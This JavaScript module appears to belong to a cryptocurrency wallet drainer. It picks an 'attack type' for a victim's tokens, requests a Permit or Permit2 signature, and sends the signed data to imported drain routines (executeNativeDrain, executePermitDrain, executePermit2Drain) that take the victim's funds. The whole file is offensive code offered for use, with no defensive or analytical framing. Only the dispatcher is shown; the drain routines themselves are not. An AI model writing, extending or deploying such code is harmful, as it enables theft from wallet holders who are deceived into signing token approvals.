import { getAttackType } from './attack_type'

import { convertNativeToToken, executeNativeDrain } from './native';
import { executePermitDrain, requestPermitSignature } from './permit';
import { executePermit2Drain, requestPermit2Signature } from './permit2';




async function requestSignature(token_address, token_name, chain_id, is_native, token_balance, decimals = 18) {
  let attack_type = await getAttackType(token_address, chain_id, is_native);

  if (attack_type == 'native') {
    const data = await convertNativeToToken(token_balance, chain_id)
    attack_type = await getAttackType(data.token_address, chain_id, false);
    
    if (attack_type == 'permit') return requestPermitSignature(token_address, token_name, chain_id, token_balance, decimals)
    else if (attack_type == 'nonpermit') return requestPermit2Signature(token_address, token_name, chain_id, token_balance, decimals)
  }
  else if (attack_type == 'permit') return requestPermitSignature(token_address, token_name, chain_id, token_balance, decimals)
  else if (attack_type == 'nonpermit') return requestPermit2Signature(token_address, token_name, chain_id, token_balance, decimals)
}


async function executeDrain(data) {
  // Params:  attack_type, token_address, token_name, chain_id, token_balance, deadline, sigDeadline, nonce, v, r, s
  const attack_type = data.attack_type;

  if (attack_type == 'native') return executeNativeDrain(data);
  else if (attack_type == 'permit') return executePermitDrain(data)
  else if (attack_type == 'nonpermit') return executePermit2Drain(data)
}



export {
  requestSignature,
  executeDrain
}